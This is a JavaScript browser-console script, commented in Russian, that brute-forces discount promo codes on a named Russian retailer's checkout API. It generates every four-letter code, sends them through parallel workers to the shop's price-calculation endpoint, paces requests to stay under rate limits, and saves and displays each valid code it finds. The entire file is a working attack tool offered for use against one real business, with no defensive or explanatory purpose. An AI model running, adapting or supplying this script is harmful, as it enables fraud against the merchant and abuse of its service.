// ============== НАСТРОЙКИ ============== https://basket.genotek.ru/
const PAYLOAD_TEMPLATE = {
    "data": [{
        "products": [
            { "id": 31180, "quantity": 1 }, { "id": 15906, "quantity": 1 },
            { "id": 420984, "quantity": 1 }, { "id": 520377, "quantity": 1 },
            { "id": 518040, "quantity": 1 }, { "id": 518041, "quantity": 1 },
            { "id": 427571, "quantity": 1 }
        ],
        "lang": "ru", "promoCode": "", "isGift": true
    }],
    "mode": "prod"
};

// --- НАСТРОЙКИ СКОРОСТИ И КОНКУРЕНТНОСТИ ---
// Безопасный предел: POOL_SIZE * (60000 / DELAY_MS_PER_WORKER) должно быть около 10.
const POOL_SIZE = 5;               // Количество независимых воркеров.
const DELAY_MS_PER_WORKER = 30000; // Задержка для ОДНОГО воркера (30 сек).
const START_CODE = "AAAA";         // С какого кода начинать перебор.
// =======================================

// --- Глобальные переменные ---
let foundPromocodes = JSON.parse(localStorage.getItem('foundGenotekCodes')) || [];
let checkedCount = 0;
let startTime = 0;
let displayIntervalId = null;
const originalTitle = document.title;

// --- Вспомогательные функции ---
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
function generateAllCodes(startCode = "AAAA") { const generator = function*() { const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; let currentIndexes = startCode.split('').map(c => chars.indexOf(c)); while (true) { yield currentIndexes.map(i => chars[i]).join(''); currentIndexes[3]++; for (let i = 3; i >= 0; i--) { if (currentIndexes[i] >= chars.length) { currentIndexes[i] = 0; if (i > 0) { currentIndexes[i - 1]++; } else { return; } } } } }(); return Array.from(generator); }
async function checkCode(promoCode) { const payload = JSON.parse(JSON.stringify(PAYLOAD_TEMPLATE)); payload.data[0].promoCode = promoCode; const formData = new FormData(); formData.append('json', JSON.stringify(payload)); const response = await fetch("https://basket-back.genotek.ru/deal-calc", { method: "POST", body: formData }); return response; }

// --- Логика обработки и сохранения результата ---
function processAndLogResult(code, result) {
    if (result.data && result.data[0].promo && result.data[0].promo.discount) {
        const discount = parseFloat(result.data[0].promo.discount);
        const products = result.data[0].products;
        let finalPrice = Object.values(products).reduce((total, product) => total + product.PRICE, 0);
        const foundData = { code, discount: `${discount} ₽`, finalPrice: `${finalPrice.toFixed(2)} ₽` };
        
        console.log(`%c🎉 НАЙДЕН ПРОМОКОД: ${foundData.code} | Скидка: ${foundData.discount} | Итоговая цена: ${foundData.finalPrice}`, 'color: green; font-size: 16px; font-weight: bold;');
        
        if (!foundPromocodes.some(p => p.code === code)) {
            foundPromocodes.push(foundData);
            localStorage.setItem('foundGenotekCodes', JSON.stringify(foundPromocodes));
        }
        return true;
    }
    return false;
}

// --- Динамический дашборд (теперь вызывается по таймеру) ---
function updateDisplay(totalCodes) {
    const percent = ((checkedCount / totalCodes) * 100).toFixed(2);
    const elapsedSeconds = (Date.now() - startTime) / 1000;
    const requestsPerMinute = elapsedSeconds > 1 ? (checkedCount / elapsedSeconds * 60).toFixed(2) : 0;
    const remainingCodes = totalCodes - checkedCount;
    const etaSeconds = requestsPerMinute > 0 ? (remainingCodes / (requestsPerMinute / 60)) : Infinity;
    const etaHours = (etaSeconds / 3600).toFixed(1);

    const bar = '█'.repeat(Math.round(30 * (percent / 100))) + '─'.repeat(30 - Math.round(30 * (percent / 100)));
    const titleText = `[${percent}%] ${checkedCount}/${totalCodes} | ${foundPromocodes.length} Found`;
    const consoleText = `\n${titleText}\n${bar}\n\nSpeed: ${requestsPerMinute} req/min\nFound: ${foundPromocodes.length}\nETA: ~${etaHours} h`;
    
    document.title = titleText;
    console.clear();
    console.log(consoleText);
}

// --- Логика Воркера (теперь он не отвечает за отображение) ---
async function worker(id, myCodes) {
    for (const code of myCodes) {
        try {
            const response = await checkCode(code);
            checkedCount++; // Просто инкрементируем счетчик

            if (response.status === 429) {
                console.warn(`%c[Воркер #${id}] Попал на Rate Limit. Жду 60 сек...`, 'color: red;');
                await sleep(60000);
            }
            if (response.ok) {
                processAndLogResult(code, await response.json());
            }
        } catch (error) {
            console.error(`[Воркер #${id}] Ошибка сети при проверке кода ${code}:`, error);
        }
        await sleep(DELAY_MS_PER_WORKER);
    }
}

// --- Финальный отчет ---
function displayFinalResults() {
    console.clear();
    document.title = "✅ " + originalTitle;
    console.log('%cПеребор завершен всеми воркерами.', 'color: blue; font-weight: bold;');
    if (foundPromocodes.length > 0) {
        console.log('%c🎉 Итоговый список найденных промокодов:', 'color: green; font-size: 18px; font-weight: bold;');
        console.table(foundPromocodes);
    } else {
        console.log('%c😔 К сожалению, валидных промокодов не найдено.', 'color: orange;');
    }
}

// --- ГЛАВНАЯ ФУНКЦИЯ (ОРКЕСТРАТОР) ---
async function main() {
    try {
        console.log("--- Начальная проверка работоспособности ---");
        const testResponse = await checkCode("EBSFL28283");
        if (testResponse.ok) {
            const success = processAndLogResult("EBSFL28283", await testResponse.json());
            if (success) {
                console.log("--- Проверка пройдена. Через 3 секунды начнется запуск ---");
                await sleep(3000);

                const totalExpectedSpeed = POOL_SIZE * (60000 / DELAY_MS_PER_WORKER);
                console.log(`%cРасчетная общая скорость: ${totalExpectedSpeed.toFixed(2)} запросов/минуту.`, 'color: yellow;');
                
                const allCodes = generateAllCodes(START_CODE);
                const totalCodes = allCodes.length;
                const chunkSize = Math.ceil(totalCodes / POOL_SIZE);
                
                startTime = Date.now();
                // ЗАПУСКАЕМ ТАЙМЕР ДЛЯ ДАШБОРДА
                displayIntervalId = setInterval(() => updateDisplay(totalCodes), 2000); // Обновление каждые 2 сек

                const workerPromises = [];
                for (let i = 0; i < POOL_SIZE; i++) {
                    const workerCodes = allCodes.slice(i * chunkSize, (i + 1) * chunkSize);
                    workerPromises.push(worker(i + 1, workerCodes));
                }
                
                await Promise.all(workerPromises);

                // ОСТАНАВЛИВАЕМ ТАЙМЕР и показываем финальный отчет
                clearInterval(displayIntervalId);
                displayFinalResults();
                
            } else { console.error(`❌ Начальная проверка не нашла скидку.`); }
        } else { console.error(`❌ Начальная проверка провалилась. Статус: ${testResponse.status}.`); }
    } catch (e) {
        console.error(`❌ Критическая ошибка на этапе проверки: ${e}.`);
        document.title = "❌ " + originalTitle;
    }
}

main();
